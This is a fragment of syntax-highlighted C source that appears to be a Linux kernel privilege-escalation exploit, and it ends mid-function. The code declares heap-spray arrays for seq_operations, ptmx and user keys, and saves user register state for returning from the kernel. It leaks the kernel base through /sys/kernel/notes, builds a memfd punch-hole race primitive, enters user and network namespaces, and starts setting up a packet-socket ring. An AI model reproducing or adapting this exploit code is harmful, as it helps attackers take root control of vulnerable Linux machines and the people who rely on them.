</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">seq_ops</span><span class="p">[</span><span class="mh">0x10000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">ptmx</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">ss</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">][</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fds</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">keys</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">page_fds</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">corrupted_key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">n_keys</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">t_args</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">nfds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">timer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">suspend</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">rcu_head</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">func</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">user_key_payload</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">rcu_head</span> <span class="n">rcu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">short</span>	<span class="n">datalen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">save_state</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span> <span class="nf">__volatile__</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;movq %%cs, %0</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;movq %%ss, %1</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;movq %%rsp, %3</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;pushfq</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;popq %2</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">user_cs</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">user_ss</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">user_rflags</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">user_sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">uint64_t</span> <span class="nf">rdtsc</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">lo</span><span class="p">,</span> <span class="n">hi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span> <span class="nf">__volatile__</span> <span class="p">(</span> <span class="s">&#34;rdtsc&#34;</span> <span class="o">:</span> <span class="s">&#34;=a&#34;</span> <span class="p">(</span><span class="n">lo</span><span class="p">),</span> <span class="s">&#34;=d&#34;</span> <span class="p">(</span><span class="n">hi</span><span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">hi</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">lo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">adjust_rlimit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">rlim</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="p">(</span><span class="mi">200</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_AS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_MEMLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">136</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_FSIZE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_STACK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_CORE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// RLIMIT_FILE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">14096</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_NOFILE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_NOFILE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;setrlimit&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// SYNC
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">struct</span> <span class="n">sync_s</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">sync_s</span> <span class="o">*</span><span class="n">sync_s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">shm_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// PUNCHING HOLE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="n">mfd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">shmem_sz</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">punch_hole_prepare</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">shm_id</span> <span class="o">=</span> <span class="nf">shmget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">IPC_CREAT</span> <span class="o">|</span> <span class="mo">0666</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">shm_id</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;shmget&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">sync_s</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sync_s</span> <span class="o">*</span><span class="p">)</span><span class="nf">shmat</span><span class="p">(</span><span class="n">shm_id</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">mfd</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;x&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mfd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;memfd_create failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span> <span class="n">addr</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="n">MMAP_ADDR</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span> <span class="o">|</span> <span class="n">MAP_FIXED</span><span class="p">,</span> <span class="n">mfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">!=</span> <span class="n">MMAP_ADDR</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span> <span class="n">page</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="n">MMAP_ADDR</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">page</span> <span class="o">!=</span> <span class="n">MMAP_ADDR</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">fallocate</span><span class="p">(</span><span class="n">mfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">shmem_sz</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fallocate failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;fallocate success&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">get_kernel_base</span><span class="p">(</span><span class="kt">int</span> <span class="n">offset</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;get kernel_base&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fdd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/sys/kernel/notes&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fdd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">kernelBuf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">kernelBuf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fdd</span><span class="p">,</span><span class="n">kernelBuf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">hexdump</span><span class="p">(</span><span class="n">kernelBuf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">kernel_low</span> <span class="o">=</span> <span class="n">kernelBuf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">kernel_low_addr</span> <span class="o">=</span> <span class="n">kernel_low</span><span class="p">[</span><span class="n">offset</span><span class="o">/</span><span class="mh">0x8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">kernel_high_addr</span> <span class="o">=</span> <span class="n">kernel_low</span><span class="p">[(</span><span class="n">offset</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span><span class="o">/</span><span class="mh">0x8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;kernel_low_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">kernel_low_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;kernel_high_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">kernel_high_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">kernel_low_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">triger_punch_hole</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">fallocate</span><span class="p">(</span><span class="n">mfd</span><span class="p">,</span> <span class="n">FALLOC_FL_PUNCH_HOLE</span> <span class="o">|</span> <span class="n">FALLOC_FL_KEEP_SIZE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">shmem_sz</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fallocate&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init_namespace</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uid_t</span> <span class="n">uid</span> <span class="o">=</span> <span class="nf">getuid</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="nf">getgid</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="n">CLONE_NEWUSER</span> <span class="o">|</span> <span class="n">CLONE_NEWNS</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;unshare(CLONE_NEWUSER | CLONE_NEWNS): %m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="n">CLONE_NEWNET</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;unshare(CLONE_NEWNET): %m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/setgroups&#34;</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">snprintf</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">),</span> <span class="s">&#34;deny&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">buff</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/uid_map&#34;</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">snprintf</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">),</span> <span class="s">&#34;0 %d 1&#34;</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">buff</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/gid_map&#34;</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">snprintf</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">),</span> <span class="s">&#34;0 %d 1&#34;</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">buff</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="kt">int</span> <span class="n">cpu_n</span><span class="p">,</span> <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">cpu_set_t</span> <span class="n">set</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">set</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">CPU_SET</span><span class="p">(</span><span class="n">cpu_n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">set</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">sched_setaffinity</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">set</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">set</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;sched_setaffinity: %m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">packet_socket_rx_ring_init</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">block_size</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">frame_size</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">block_nr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sizeof_priv</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">v</span> <span class="o">=</span> <span class="n">TPACKET_V3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">rv</span> <span class="o">=</span> <span class="nf">setsockopt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SOL_PACKET</span><span class="p">,</span> <span class="n">PACKET_VERSION</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">rv</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;setsockopt(PACKET_VERSION): %m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
